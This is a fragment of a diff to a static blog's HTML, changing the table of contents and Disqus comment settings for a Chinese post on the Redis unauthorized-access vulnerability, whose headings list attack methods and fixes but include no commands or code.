+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、Redis介绍"><span class="nav-number">1.</span> <span class="nav-text">一、Redis介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、漏洞原理"><span class="nav-number">2.</span> <span class="nav-text">二、漏洞原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、Redis安装"><span class="nav-number">3.</span> <span class="nav-text">二、Redis安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、Redis服务器配置"><span class="nav-number">4.</span> <span class="nav-text">二、Redis服务器配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、Redis客户端连接"><span class="nav-number">5.</span> <span class="nav-text">三、Redis客户端连接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、基础命令"><span class="nav-number">6.</span> <span class="nav-text">四、基础命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五、攻击利用方式"><span class="nav-number">7.</span> <span class="nav-text">五、攻击利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-写Webshell"><span class="nav-number">7.1.</span> <span class="nav-text">1. 写Webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-ssh配置免密登录"><span class="nav-number">7.2.</span> <span class="nav-text">2. ssh配置免密登录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-反弹shell"><span class="nav-number">7.3.</span> <span class="nav-text">3. 反弹shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#六、修复"><span class="nav-number">8.</span> <span class="nav-text">六、修复</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#低权限运行Redis服务"><span class="nav-number">8.0.1.</span> <span class="nav-text">低权限运行Redis服务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#禁止命令"><span class="nav-number">8.0.2.</span> <span class="nav-text">禁止命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#添加密码认证"><span class="nav-number">8.0.3.</span> <span class="nav-text">添加密码认证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#禁止外网访问"><span class="nav-number">8.0.4.</span> <span class="nav-text">禁止外网访问</span></a></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#七、总结"><span class="nav-number">9.</span> <span class="nav-text">七、总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#八、参考文章："><span class="nav-number">10.</span> <span class="nav-text">八、参考文章：</span></a></li></div>
             
 
           </div>
@@ -926,9 +922,9 @@
     
       <script type="text/javascript">
         var disqus_config = function () {
-          this.page.url = 'https://jeremyekek.github.io/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/';
-          this.page.identifier = '2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/';
-          this.page.title = 'CVE-2018-20250-WinRAR远程代码执行漏洞';
+          this.page.url = 'https://jeremyekek.github.io/2019/05/15/Redis未授权访问漏洞/';
+          this.page.identifier = '2019/05/15/Redis未授权访问漏洞/';
+          this.page.title = 'Redis未授权访问漏洞';
         };
         var d = document, s = d.createElement('script');
         s.src = 'https://jeremyekek-github-io.disqus.com/embed.js';
